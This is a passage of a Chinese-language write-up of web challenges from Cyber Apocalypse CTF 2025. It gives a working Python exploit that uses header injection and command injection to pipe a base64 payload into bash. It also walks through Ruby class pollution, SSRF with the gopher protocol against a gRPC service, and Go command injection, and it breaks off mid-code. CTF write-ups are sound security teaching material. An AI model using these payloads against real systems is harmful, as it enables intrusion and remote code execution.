+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span>  <span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s1">/cgi-bin/attack-domain?target=test&amp;name=asdfasfd%0d%0aLocation:/as%0d%0aContent-Type:</span><span class="si">{</span><span class="n">handler</span><span class="si">}</span><span class="s1">%0d%0a%0d%0a&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/img/Cyber-Apocalypse-CTF-2025-WEB/10.png"
+        data-srcset="/img/Cyber-Apocalypse-CTF-2025-WEB/10.png, /img/Cyber-Apocalypse-CTF-2025-WEB/10.png 1.5x, /img/Cyber-Apocalypse-CTF-2025-WEB/10.png 2x"
+        data-sizes="auto"
+        alt="/img/Cyber-Apocalypse-CTF-2025-WEB/10.png"
+        title="/img/Cyber-Apocalypse-CTF-2025-WEB/10.png" />
+所以最后的playload</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-python">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">requests</span> <span class="kn">import</span> <span class="n">get</span>
+</span></span><span class="line"><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://localhost:1337&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">quote</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="sa">f</span><span class="s1">&#39;%</span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))[</span><span class="mi">2</span><span class="p">:]</span><span class="si">}</span><span class="s1">&#39;</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">s</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">dquote</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">quote</span><span class="p">(</span><span class="n">quote</span><span class="p">(</span><span class="n">s</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b64encode</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;cat /flag* &gt; /var/www/html/flag.txt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">handler</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;proxy:http://127.0.0.1/cgi-bin/attack-ip?name=asfs</span><span class="si">{</span><span class="n">quote</span><span class="p">(</span><span class="s1">&#39;&amp;&#39;</span><span class="p">)</span><span class="si">}</span><span class="s1">target=::1</span><span class="si">{</span><span class="n">dquote</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;%; echo </span><span class="se">\&#34;</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="se">\&#34;</span><span class="s2"> | base64 -d | bash&#34;</span><span class="p">)</span><span class="si">}{</span><span class="n">quote</span><span class="p">(</span><span class="s1">&#39;&amp;&#39;</span><span class="p">)</span><span class="si">}</span><span class="s1">dummy=&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s1">/cgi-bin/attack-domain?target=test&amp;name=asdfasfd%0d%0aLocation:/as%0d%0aContent-Type:</span><span class="si">{</span><span class="n">handler</span><span class="si">}</span><span class="s1">%0d%0a%0d%0a&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">get</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s1">/flag.txt&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="p">)</span></span></span></code></pre></div></div>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/img/Cyber-Apocalypse-CTF-2025-WEB/11.png"
+        data-srcset="/img/Cyber-Apocalypse-CTF-2025-WEB/11.png, /img/Cyber-Apocalypse-CTF-2025-WEB/11.png 1.5x, /img/Cyber-Apocalypse-CTF-2025-WEB/11.png 2x"
+        data-sizes="auto"
+        alt="/img/Cyber-Apocalypse-CTF-2025-WEB/11.png"
+        title="/img/Cyber-Apocalypse-CTF-2025-WEB/11.png" /></p>
+<h2 id="eldoria-realms">Eldoria Realms</h2>
+<p>出了一个ruby的原型链污染+打GRPC injection然后rce，bao师傅说铁三出了一个ruby是0解&hellip;.你放在中等难度吗
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/img/Cyber-Apocalypse-CTF-2025-WEB/12.png"
+        data-srcset="/img/Cyber-Apocalypse-CTF-2025-WEB/12.png, /img/Cyber-Apocalypse-CTF-2025-WEB/12.png 1.5x, /img/Cyber-Apocalypse-CTF-2025-WEB/12.png 2x"
+        data-sizes="auto"
+        alt="/img/Cyber-Apocalypse-CTF-2025-WEB/12.png"
+        title="/img/Cyber-Apocalypse-CTF-2025-WEB/12.png" />
+其中有几个路由：</p>
+<ul>
+<li>player:就是一个用户的信息，并且有merge的方法去update信息</li>
+<li>Quest：其中包含了几个问题和他的奖金
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/img/Cyber-Apocalypse-CTF-2025-WEB/13.png"
+        data-srcset="/img/Cyber-Apocalypse-CTF-2025-WEB/13.png, /img/Cyber-Apocalypse-CTF-2025-WEB/13.png 1.5x, /img/Cyber-Apocalypse-CTF-2025-WEB/13.png 2x"
+        data-sizes="auto"
+        alt="/img/Cyber-Apocalypse-CTF-2025-WEB/13.png"
+        title="/img/Cyber-Apocalypse-CTF-2025-WEB/13.png" /></li>
+<li>store：就是一个商店
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/img/Cyber-Apocalypse-CTF-2025-WEB/14.png"
+        data-srcset="/img/Cyber-Apocalypse-CTF-2025-WEB/14.png, /img/Cyber-Apocalypse-CTF-2025-WEB/14.png 1.5x, /img/Cyber-Apocalypse-CTF-2025-WEB/14.png 2x"
+        data-sizes="auto"
+        alt="/img/Cyber-Apocalypse-CTF-2025-WEB/14.png"
+        title="/img/Cyber-Apocalypse-CTF-2025-WEB/14.png" /></li>
+<li>fellowship：保存了几个用户信息
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/img/Cyber-Apocalypse-CTF-2025-WEB/15.png"
+        data-srcset="/img/Cyber-Apocalypse-CTF-2025-WEB/15.png, /img/Cyber-Apocalypse-CTF-2025-WEB/15.png 1.5x, /img/Cyber-Apocalypse-CTF-2025-WEB/15.png 2x"
+        data-sizes="auto"
+        alt="/img/Cyber-Apocalypse-CTF-2025-WEB/15.png"
+        title="/img/Cyber-Apocalypse-CTF-2025-WEB/15.png" /></li>
+<li>livedata：感觉像是更新信息
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/img/Cyber-Apocalypse-CTF-2025-WEB/16.png"
+        data-srcset="/img/Cyber-Apocalypse-CTF-2025-WEB/16.png, /img/Cyber-Apocalypse-CTF-2025-WEB/16.png 1.5x, /img/Cyber-Apocalypse-CTF-2025-WEB/16.png 2x"
+        data-sizes="auto"
+        alt="/img/Cyber-Apocalypse-CTF-2025-WEB/16.png"
+        title="/img/Cyber-Apocalypse-CTF-2025-WEB/16.png" /></li>
+<li>Adnvanced：可以召唤Helios和connect to realm的功能
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/img/Cyber-Apocalypse-CTF-2025-WEB/17.png"
+        data-srcset="/img/Cyber-Apocalypse-CTF-2025-WEB/17.png, /img/Cyber-Apocalypse-CTF-2025-WEB/17.png 1.5x, /img/Cyber-Apocalypse-CTF-2025-WEB/17.png 2x"
+        data-sizes="auto"
+        alt="/img/Cyber-Apocalypse-CTF-2025-WEB/17.png"
+        title="/img/Cyber-Apocalypse-CTF-2025-WEB/17.png" /></li>
+</ul>
+<h3 id="污染our_url">污染our_url</h3>
+<p>然后我们来看到源代码:</p>
+<div class="code-block code-line-numbers" style="counter-reset: code-block 0">
+    <div class="code-header language-ruby">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Adventurer</span>
+</span></span><span class="line"><span class="cl">	<span class="vc">@@realm_url</span> <span class="o">=</span> <span class="s2">&#34;http://eldoria-realm.htb&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="kp">attr_accessor</span> <span class="ss">:name</span><span class="p">,</span> <span class="ss">:age</span><span class="p">,</span> <span class="ss">:attributes</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">realm_url</span>
+</span></span><span class="line"><span class="cl">		<span class="vc">@@realm_url</span>
+</span></span><span class="line"><span class="cl">	<span class="k">end</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="nb">name</span><span class="p">:,</span> <span class="ss">age</span><span class="p">:,</span> <span class="ss">attributes</span><span class="p">:)</span>
+</span></span><span class="line"><span class="cl">		<span class="vi">@name</span> <span class="o">=</span> <span class="nb">name</span>
+</span></span><span class="line"><span class="cl">		<span class="vi">@age</span> <span class="o">=</span> <span class="n">age</span>
+</span></span><span class="line"><span class="cl">		<span class="vi">@attributes</span> <span class="o">=</span> <span class="n">attributes</span>
+</span></span><span class="line"><span class="cl">	<span class="k">end</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">def</span> <span class="nf">merge_with</span><span class="p">(</span><span class="n">additional</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="n">recursive_merge</span><span class="p">(</span><span class="nb">self</span><span class="p">,</span> <span class="n">additional</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="k">end</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="kp">private</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">def</span> <span class="nf">recursive_merge</span><span class="p">(</span><span class="n">original</span><span class="p">,</span> <span class="n">additional</span><span class="p">,</span> <span class="n">current_obj</span> <span class="o">=</span> <span class="n">original</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">additional</span><span class="o">.</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="o">|</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="n">value</span><span class="o">.</span><span class="n">is_a?</span><span class="p">(</span><span class="no">Hash</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">current_obj</span><span class="o">.</span><span class="n">respond_to?</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">          <span class="n">next_obj</span> <span class="o">=</span> <span class="n">current_obj</span><span class="o">.</span><span class="n">public_send</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">          <span class="n">recursive_merge</span><span class="p">(</span><span class="n">original</span><span class="p">,</span> <span class="n">value</span><span class="p">,</span> <span class="n">next_obj</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span>
+</span></span><span class="line"><span class="cl">          <span class="n">new_object</span> <span class="o">=</span> <span class="no">Object</span><span class="o">.</span><span class="n">new</span>
+</span></span><span class="line"><span class="cl">          <span class="n">current_obj</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="s2">&#34;@</span><span class="si">#{</span><span class="n">key</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">new_object</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">          <span class="n">current_obj</span><span class="o">.</span><span class="n">singleton_class</span><span class="o">.</span><span class="n">attr_accessor</span> <span class="n">key</span>
+</span></span><span class="line"><span class="cl">        <span class="k">end</span>
+</span></span><span class="line"><span class="cl">      <span class="k">else</span>
+</span></span><span class="line"><span class="cl">        <span class="n">current_obj</span><span class="o">.</span><span class="n">instance_variable_set</span><span class="p">(</span><span class="s2">&#34;@</span><span class="si">#{</span><span class="n">key</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">current_obj</span><span class="o">.</span><span class="n">singleton_class</span><span class="o">.</span><span class="n">attr_accessor</span> <span class="n">key</span>
+</span></span><span class="line"><span class="cl">      <span class="k">end</span>
+</span></span><span class="line"><span class="cl">    <span class="k">end</span>
+</span></span><span class="line"><span class="cl">    <span class="n">original</span>
+</span></span><span class="line"><span class="cl">  <span class="k">end</span>
+</span></span><span class="line"><span class="cl"><span class="k">end</span></span></span></code></pre></div></div>
+<p>可以看到有merge的方法，也就是这里其实是存在原型链污染的。
+然后在这个应用中可以看到merge_with调用了recursive_merge方法，
+并且从merge-fates路由获取用户输入的json数据作为输入</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-ruby">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">post</span> <span class="s2">&#34;/merge-fates&#34;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">    <span class="n">content_type</span> <span class="ss">:json</span>
+</span></span><span class="line"><span class="cl">    <span class="n">json_input</span> <span class="o">=</span> <span class="no">JSON</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">body</span><span class="o">.</span><span class="n">read</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">random_attributes</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;class&#34;</span> <span class="o">=&gt;</span> <span class="o">[</span><span class="s2">&#34;Warrior&#34;</span><span class="p">,</span> <span class="s2">&#34;Mage&#34;</span><span class="p">,</span> <span class="s2">&#34;Rogue&#34;</span><span class="p">,</span> <span class="s2">&#34;Cleric&#34;</span><span class="o">].</span><span class="n">sample</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;guild&#34;</span> <span class="o">=&gt;</span> <span class="o">[</span><span class="s2">&#34;The Unbound&#34;</span><span class="p">,</span> <span class="s2">&#34;Order of the Phoenix&#34;</span><span class="p">,</span> <span class="s2">&#34;The Fallen&#34;</span><span class="p">,</span> <span class="s2">&#34;Guardians of the Realm&#34;</span><span class="o">].</span><span class="n">sample</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;location&#34;</span> <span class="o">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;realm&#34;</span> <span class="o">=&gt;</span> <span class="s2">&#34;Eldoria&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="s2">&#34;zone&#34;</span> <span class="o">=&gt;</span> <span class="o">[</span><span class="s2">&#34;Twilight Fields&#34;</span><span class="p">,</span> <span class="s2">&#34;Shadow Woods&#34;</span><span class="p">,</span> <span class="s2">&#34;Crystal Caverns&#34;</span><span class="p">,</span> <span class="s2">&#34;Flaming Peaks&#34;</span><span class="o">].</span><span class="n">sample</span>
+</span></span><span class="line"><span class="cl">        <span class="p">},</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;inventory&#34;</span> <span class="o">=&gt;</span> <span class="o">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="vg">$player</span> <span class="o">=</span> <span class="no">Player</span><span class="o">.</span><span class="n">new</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">name</span><span class="p">:</span> <span class="s2">&#34;Valiant Hero&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="ss">age</span><span class="p">:</span> <span class="mi">21</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="ss">attributes</span><span class="p">:</span> <span class="n">random_attributes</span>
+</span></span><span class="line"><span class="cl">    <span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="vg">$player</span><span class="o">.</span><span class="n">merge_with</span><span class="p">(</span><span class="n">json_input</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">        <span class="ss">status</span><span class="p">:</span> <span class="s2">&#34;Fates merged&#34;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">        <span class="ss">player</span><span class="p">:</span> <span class="p">{</span> 
+</span></span><span class="line"><span class="cl">            <span class="nb">name</span><span class="p">:</span> <span class="vg">$player</span><span class="o">.</span><span class="n">name</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">            <span class="ss">age</span><span class="p">:</span> <span class="vg">$player</span><span class="o">.</span><span class="n">age</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">            <span class="ss">attributes</span><span class="p">:</span> <span class="vg">$player</span><span class="o">.</span><span class="n">attributes</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> 
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="o">.</span><span class="n">to_json</span>
+</span></span><span class="line"><span class="cl"><span class="k">end</span></span></span></code></pre></div></div>
+<p>所以我们可以污染其中的our_url属性从而更改其connect</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-json">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="nt">&#34;class&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&#34;superclass&#34;</span><span class="p">:</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="nt">&#34;realm_url&#34;</span><span class="p">:</span> <span class="s2">&#34;our_url&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div>
+<h3 id="利用ssrf请求走私grpc-packet">利用SSRF请求走私GRPC packet</h3>
+<p>污染了our_url后可以看到connect-realm路由，可以看到调用了curl命令</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-ruby">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="n">get</span> <span class="s2">&#34;/connect-realm&#34;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">    <span class="n">content_type</span> <span class="ss">:json</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="no">Adventurer</span><span class="o">.</span><span class="n">respond_to?</span><span class="p">(</span><span class="ss">:realm_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">realm_url</span> <span class="o">=</span> <span class="no">Adventurer</span><span class="o">.</span><span class="n">realm_url</span>
+</span></span><span class="line"><span class="cl">        <span class="k">begin</span>
+</span></span><span class="line"><span class="cl">            <span class="n">uri</span> <span class="o">=</span> <span class="no">URI</span><span class="o">.</span><span class="n">parse</span><span class="p">(</span><span class="n">realm_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">stdout</span><span class="p">,</span> <span class="n">stderr</span><span class="p">,</span> <span class="n">status</span> <span class="o">=</span> <span class="no">Open3</span><span class="o">.</span><span class="n">capture3</span><span class="p">(</span><span class="s2">&#34;curl&#34;</span><span class="p">,</span> <span class="s2">&#34;-o&#34;</span><span class="p">,</span> <span class="s2">&#34;/dev/null&#34;</span><span class="p">,</span> <span class="s2">&#34;-w&#34;</span><span class="p">,</span> <span class="s2">&#34;%{http_code}&#34;</span><span class="p">,</span> <span class="n">uri</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span> <span class="ss">status</span><span class="p">:</span> <span class="s2">&#34;HTTP request made&#34;</span><span class="p">,</span> <span class="ss">realm_url</span><span class="p">:</span> <span class="n">realm_url</span><span class="p">,</span> <span class="ss">response_body</span><span class="p">:</span> <span class="n">stdout</span> <span class="p">}</span><span class="o">.</span><span class="n">to_json</span>
+</span></span><span class="line"><span class="cl">        <span class="k">rescue</span> <span class="no">URI</span><span class="o">::</span><span class="no">InvalidURIError</span> <span class="o">=&gt;</span> <span class="n">e</span>
+</span></span><span class="line"><span class="cl">            <span class="p">{</span> <span class="ss">status</span><span class="p">:</span> <span class="s2">&#34;Invalid URL: </span><span class="si">#{</span><span class="n">e</span><span class="o">.</span><span class="n">message</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="ss">realm_url</span><span class="p">:</span> <span class="n">realm_url</span> <span class="p">}</span><span class="o">.</span><span class="n">to_json</span>
+</span></span><span class="line"><span class="cl">        <span class="k">end</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span> <span class="ss">status</span><span class="p">:</span> <span class="s2">&#34;Failed to access realm URL&#34;</span> <span class="p">}</span><span class="o">.</span><span class="n">to_json</span>
+</span></span><span class="line"><span class="cl">    <span class="k">end</span>
+</span></span><span class="line"><span class="cl"><span class="k">end</span></span></span></code></pre></div></div>
+<p>然后看到dockerfile</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-dockerfile">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-dockerfile" data-lang="dockerfile"><span class="line"><span class="cl"><span class="c"># Install curl with shared library support</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="k">RUN</span> wget https://curl.haxx.se/download/curl-7.70.0.tar.gz <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">    tar xfz curl-7.70.0.tar.gz <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">    <span class="nb">cd</span> curl-7.70.0/ <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">    ./configure --with-ssl --enable-shared <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">    make -j16 <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">    make install <span class="o">&amp;&amp;</span> <span class="se">\
+</span></span></span><span class="line"><span class="cl">    ldconfig</span></span></code></pre></div></div>
+<p>可以看到curl版本为7.7,0.0，便可以利用gopher协议进行攻击，我们就可以利用它来攻击GRPC。端口为：<code>127.0.0.1:50051</code>,也就是污染前面的our_url然后调用connect之后将gopher的数据一起带过来就可以trigger curl这个地方了，接着我们就利用app.go中的命令进行注入即可</p>
+<h3 id="go命令注入">go命令注入</h3>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-go">
+        <span class="code-title"><i class="arrow fas fa-angle-right" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h" aria-hidden="true"></i></span>
+        <span class="copy" title="Copy to clipboard"><i class="far fa-copy" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="line"><span class="cl"><span class="kd">func</span><span class="w"> </span><span class="p">(</span><span class="nx">s</span><span class="w"> </span><span class="o">*</span><span class="nx">server</span><span class="p">)</span><span class="w"> </span><span class="nf">CheckHealth</span><span class="p">(</span><span class="nx">ctx</span><span class="w"> </span><span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span><span class="w"> </span><span class="nx">req</span><span class="w"> </span><span class="o">*</span><span class="nx">pb</span><span class="p">.</span><span class="nx">HealthCheckRequest</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="o">*</span><span class="nx">pb</span><span class="p">.</span><span class="nx">HealthCheckResponse</span><span class="p">,</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">ip</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">Ip</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">port</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">Port</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="nx">ip</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">ip</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">s</span><span class="p">.</span><span class="nx">ip</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="nx">port</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="nx">port</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">s</span><span class="p">.</span><span class="nx">port</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nf">healthCheck</span><span class="p">(</span><span class="nx">ip</span><span class="p">,</span><span class="w"> </span><span class="nx">port</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">		</span><span class="k">return</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">pb</span><span class="p">.</span><span class="nx">HealthCheckResponse</span><span class="p">{</span><span class="nx">Status</span><span class="p">:</span><span class="w"> </span><span class="s">&#34;unhealthy&#34;</span><span class="p">},</span><span class="w"> </span><span class="kc">nil</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="p">}</span><span class="w">
